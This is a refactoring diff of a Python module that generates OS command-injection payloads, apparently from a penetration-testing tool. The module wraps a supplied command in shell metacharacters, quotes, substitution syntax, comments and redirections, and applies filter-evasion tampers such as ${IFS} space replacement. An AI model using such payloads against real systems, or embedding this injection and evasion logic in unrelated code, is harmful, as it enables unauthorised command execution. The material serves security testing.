@@ -1,5 +1,6 @@
 from typing import Generator
 
+
 COMMENT_CHARS = ("#",)
 
 META_CHARS = (
@@ -20,17 +21,21 @@ SUBSTITUTION_PATTERNS = (
     "`%(cmd)s`",
 )
 
-ENDINGS = (">/dev/null", "2>/dev/null")
+ENDINGS = (
+    ">/dev/null",
+    "2>/dev/null",
+)
 
 
-def replace_spaces_with_ifs(cmd: str):
+def replace_spaces_with_ifs(cmd: str) -> str:
     if " " not in cmd:
         return cmd
 
     return cmd.replace(" ", "${IFS}")
 
 
-def add_dollar_and_ats(cmd: str):
+def add_dollar_and_ats(cmd: str) -> str:
+
     final = ""
 
     for char in cmd:
@@ -52,9 +57,10 @@ def build_payloads(
 
     for tampers in tampers_patterns:
         for sp in SUBSTITUTION_PATTERNS:
-            yield sp % {"cmd": cmd}
 
             tampered = sp % {"cmd": cmd}
+
+            yield tampered
 
             for tamper in tampers:
                 tampered = tamper(tampered)
@@ -63,9 +69,9 @@ def build_payloads(
 
         for quote in QUOTE_CHARS:
             for meta_chr in META_CHARS:
-                yield quote + meta_chr + cmd
-
                 tampered = quote + meta_chr + cmd
+
+                yield tampered
 
                 for tamper in tampers:
                     tampered = tamper(tampered)
@@ -73,9 +79,9 @@ def build_payloads(
                 yield tampered
 
                 for comment_chr in COMMENT_CHARS:
-                    yield quote + meta_chr + cmd + comment_chr
-
                     tampered = quote + meta_chr + cmd + comment_chr
+
+                    yield tampered
 
                     for tamper in tampers:
                         tampered = tamper(tampered)
@@ -83,9 +89,9 @@ def build_payloads(
                     yield tampered
 
                 for end in ENDINGS:
-                    yield quote + end + meta_chr + cmd
-
                     tampered = quote + end + meta_chr + cmd
+
+                    yield tampered
 
                     for tamper in tampers:
                         tampered = tamper(tampered)
@@ -93,9 +99,9 @@ def build_payloads(
                     yield tampered
 
                     for comment_chr in COMMENT_CHARS:
-                        yield quote + end + meta_chr + cmd + comment_chr
-
                         tampered = quote + end + meta_chr + cmd + comment_chr
+
+                        yield tampered
 
                         for tamper in tampers:
                             tampered = tamper(tampered)
@@ -103,9 +109,9 @@ def build_payloads(
                         yield tampered
 
         for meta_chr in META_CHARS:
-            yield meta_chr + cmd
-
             tampered = meta_chr + cmd
+
+            yield tampered
 
             for tamper in tampers:
                 tampered = tamper(tampered)
@@ -113,9 +119,9 @@ def build_payloads(
             yield tampered
 
             for comment_chr in COMMENT_CHARS:
-                yield meta_chr + cmd + comment_chr
-
                 tampered = meta_chr + cmd + comment_chr
+
+                yield tampered
 
                 for tamper in tampers:
                     tampered = tamper(tampered)
@@ -123,9 +129,9 @@ def build_payloads(
                 yield tampered
 
             for end in ENDINGS:
-                yield end + meta_chr + cmd
-
                 tampered = end + meta_chr + cmd
+
+                yield tampered
 
                 for tamper in tampers:
                     tampered = tamper(tampered)
@@ -133,9 +139,9 @@ def build_payloads(
                 yield tampered
 
                 for comment_chr in COMMENT_CHARS:
-                    yield end + meta_chr + cmd + comment_chr
-
                     tampered = end + meta_chr + cmd + comment_chr
+
+                    yield tampered
 
                     for tamper in tampers:
                         tampered = tamper(tampered)
@@ -144,11 +150,11 @@ def build_payloads(
 
         for tamper in tampers:
             cmd = tamper(cmd)
-
         for sp in SUBSTITUTION_PATTERNS:
-            yield sp % {"cmd": cmd}
 
             tampered = sp % {"cmd": cmd}
+
+            yield tampered
 
             for tamper in tampers:
                 tampered = tamper(tampered)
@@ -157,9 +163,9 @@ def build_payloads(
 
         for quote in QUOTE_CHARS:
             for meta_chr in META_CHARS:
-                yield quote + meta_chr + cmd
-
                 tampered = quote + meta_chr + cmd
+
+                yield tampered
 
                 for tamper in tampers:
                     tampered = tamper(tampered)
@@ -167,9 +173,9 @@ def build_payloads(
                 yield tampered
 
                 for comment_chr in COMMENT_CHARS:
-                    yield quote + meta_chr + cmd + comment_chr
-
                     tampered = quote + meta_chr + cmd + comment_chr
+
+                    yield tampered
 
                     for tamper in tampers:
                         tampered = tamper(tampered)
@@ -177,9 +183,9 @@ def build_payloads(
                     yield tampered
 
                 for end in ENDINGS:
-                    yield quote + end + meta_chr + cmd
-
                     tampered = quote + end + meta_chr + cmd
+
+                    yield tampered
 
                     for tamper in tampers:
                         tampered = tamper(tampered)
@@ -187,9 +193,9 @@ def build_payloads(
                     yield tampered
 
                     for comment_chr in COMMENT_CHARS:
-                        yield quote + end + meta_chr + cmd + comment_chr
-
                         tampered = quote + end + meta_chr + cmd + comment_chr
+
+                        yield tampered
 
                         for tamper in tampers:
                             tampered = tamper(tampered)
@@ -197,9 +203,9 @@ def build_payloads(
                         yield tampered
 
         for meta_chr in META_CHARS:
-            yield meta_chr + cmd
-
             tampered = meta_chr + cmd
+
+            yield tampered
 
             for tamper in tampers:
                 tampered = tamper(tampered)
@@ -207,9 +213,9 @@ def build_payloads(
             yield tampered
 
             for comment_chr in COMMENT_CHARS:
-                yield meta_chr + cmd + comment_chr
-
                 tampered = meta_chr + cmd + comment_chr
+
+                yield tampered
 
                 for tamper in tampers:
                     tampered = tamper(tampered)
@@ -217,9 +223,9 @@ def build_payloads(
                 yield tampered
 
             for end in ENDINGS:
-                yield end + meta_chr + cmd
-
                 tampered = end + meta_chr + cmd
+
+                yield tampered
 
                 for tamper in tampers:
                     tampered = tamper(tampered)
@@ -227,9 +233,9 @@ def build_payloads(
                 yield tampered
 
                 for comment_chr in COMMENT_CHARS:
-                    yield end + meta_chr + cmd + comment_chr
-
                     tampered = end + meta_chr + cmd + comment_chr
+
+                    yield tampered
 
                     for tamper in tampers:
                         tampered = tamper(tampered)
